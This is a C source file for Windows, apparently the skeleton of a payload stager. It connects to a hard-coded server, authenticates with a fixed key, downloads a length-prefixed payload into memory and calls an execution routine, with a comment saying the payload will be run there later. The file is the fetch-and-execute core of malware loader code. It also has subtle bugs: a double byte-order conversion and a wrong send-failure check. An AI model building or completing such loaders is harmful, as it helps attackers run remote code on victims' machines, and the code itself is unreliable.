#ifndef _WIN32_WINNT
#define _WIN32_WINNT 0x0600
#endif

#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include "execution.h"

#pragma comment(lib, "ws2_32.lib")

#define LENGTH_PREFIX_SIZE 4
#define BUFFER_SIZE 512

const char* SERVER_IP = "127.0.0.1";
const char* SERVER_PORT = "8080";
const unsigned int KEY_SIZE = 15;


void printBytes(const unsigned char* data, size_t dataLen) {
	for (size_t i = 0; i < dataLen; ++i) {
		printf("%02x ", data[i]);
	}
	printf("\n");
}

int initializeWSA(void) {
	WSADATA wsa_data;
	return WSAStartup(MAKEWORD(2, 2), &wsa_data);
}

void cleanup(SOCKET server_socket) 
{
	printf("[+] Cleaning up ...\n");
	
	if (server_socket != INVALID_SOCKET)
	{
		closesocket(server_socket);
	}

	WSACleanup();
}

int initialize_client(SOCKET* server_socket)
{
	printf("[+] Configuring remote address ...\n");

	struct addrinfo hints;
	memset(&hints, 0, sizeof(hints));
	
	hints.ai_socktype = SOCK_STREAM;

	struct addrinfo* server_address = NULL;
	if (getaddrinfo(SERVER_IP, SERVER_PORT, &hints, &server_address) != 0)
	{
		fprintf(stderr, "[!] getaddrinfo() failed. (%d)\n", WSAGetLastError());
		freeaddrinfo(server_address);
		return 1;
	}

	printf("[+] Creating socket ...\n");

	*server_socket = socket(
		server_address->ai_family,
		server_address->ai_socktype,
		server_address->ai_protocol
	);

	// Check if socket is valid
	if (*server_socket == INVALID_SOCKET)
	{
		fprintf(stderr, "[!] socket() failed. (%d)\n", WSAGetLastError());
		freeaddrinfo(server_address);
		server_address = NULL;
		return 1;
	}

	printf("[+] Connecting to remote host ...\n");

	if (connect(*server_socket, server_address->ai_addr, server_address->ai_addrlen) != 0)
	{
		fprintf(stderr, "[!] connect() failed. (%d)\n", WSAGetLastError());
		freeaddrinfo(server_address);
		server_address = NULL;
		cleanup(*server_socket);
		return 1;
	}
	freeaddrinfo(server_address);
	server_address = NULL;

	printf("[+] Connected to remote host at %s:%s\n", SERVER_IP, SERVER_PORT);

	return 0;
}

int authenticate(SOCKET server_socket, const char* key)
{
	printf("[+] Authenticating with remote host ...\n");

	int bytes_sent = send(server_socket, key, KEY_SIZE, 0);
	if (bytes_sent == 0)
	{
		fprintf(stderr, "[!] send() failed. (%d)\n", WSAGetLastError());
		return 1;
	}

	return 0;
}

int receive_data(SOCKET server_socket, char** payload, size_t* final_payload_size)
{
	// Create buffer to hold first 4 bytes of data - the length prefix
	char length_prefix_buffer[LENGTH_PREFIX_SIZE];

	// Receive the length data into the buffer
	int length_bytes_received = recv(server_socket, length_prefix_buffer, LENGTH_PREFIX_SIZE, 0);

	if (length_bytes_received <= 0)
	{
		fprintf(stderr, "[!] recv() failed. (%d)\n", WSAGetLastError());
		return 1;
	}

	// Convert the 4 bytes in the prefix to a 32-bit big-endian integer
	uint32_t preprocessed_payload_size = (uint32_t)(
		(unsigned char)length_prefix_buffer[3] << 24 |
		(unsigned char)length_prefix_buffer[2] << 16 |
		(unsigned char)length_prefix_buffer[1] << 8  |
		(unsigned char)length_prefix_buffer[0]);

	// Correctly apply ntohl to convert network byte order to host byte order
	uint32_t payload_size = ntohl(preprocessed_payload_size);
	*final_payload_size = payload_size;

	// Initialize counter to track total number of payload bytes received so far
	size_t payload_bytes_received = 0;

	// Allocate memory to store the payload now that we know its size
	*payload = (char*)calloc(payload_size, 1);

	if (*payload == NULL)
	{
		fprintf(stderr, "[!] malloc() failed.\n");
		return 1;
	}

	// Use a loop to process payload stream in chunks
	while (payload_bytes_received < payload_size)
	{
		// Default chunk size is BUFFER_SIZE so we take min between that and what's left 
		size_t bytes_to_receive = (size_t)min(BUFFER_SIZE, payload_size - payload_bytes_received);

		// Read bytes from the socket into the payload buffer, offset by payload_bytes_received
		int bytes_received = recv(server_socket, *payload + payload_bytes_received, bytes_to_receive, 0);

		if (bytes_received < 0) {
			// An actual error occurred
			fprintf(stderr, "[!] recv() failed. (%d)\n", WSAGetLastError());
			free(*payload);
			return 1;
		} else if (bytes_received == 0) {
			// Connection closed gracefully by the peer
			if (payload_bytes_received < payload_size) {
				fprintf(stderr, "[!] Connection closed before all data was received.\n");
				free(*payload);
				return 1;
			}
			break; // Exit the loop as no more data is expected
		}

		// Update the number of bytes which have been received so far
		payload_bytes_received += bytes_received;
	}

	return 0;
}

int main(void)
{
	if (initializeWSA() != 0)
	{
		printf("[!] Failed to run WSAStartup.\n");
		return 1;
	}

	SOCKET server_socket;
	if (initialize_client(&server_socket) != 0)
	{
		fprintf(stderr, "[!] initialize_client() failed.\n");
		cleanup(server_socket);
		return 1;
	}

	const char* key = "This is a test!";
	if (authenticate(server_socket, key) != 0)
	{
		fprintf(stderr, "[!] authenticate() failed.\n");
		cleanup(server_socket);
		return 1;
	}

	// Receive payload from server
	char* payload = NULL;
	size_t payload_size = 0;
	if (receive_data(server_socket, &payload, &payload_size) != 0)
	{
		fprintf(stderr, "[!] receive_data() failed.\n");
		free(payload);
		cleanup(server_socket);
		return 1;
	}

	// Here we are printing, but later on this is where the payload will be executed
	int result = execute_payload(NULL, 0);

	free(payload);
	cleanup(server_socket);
	return 0;
}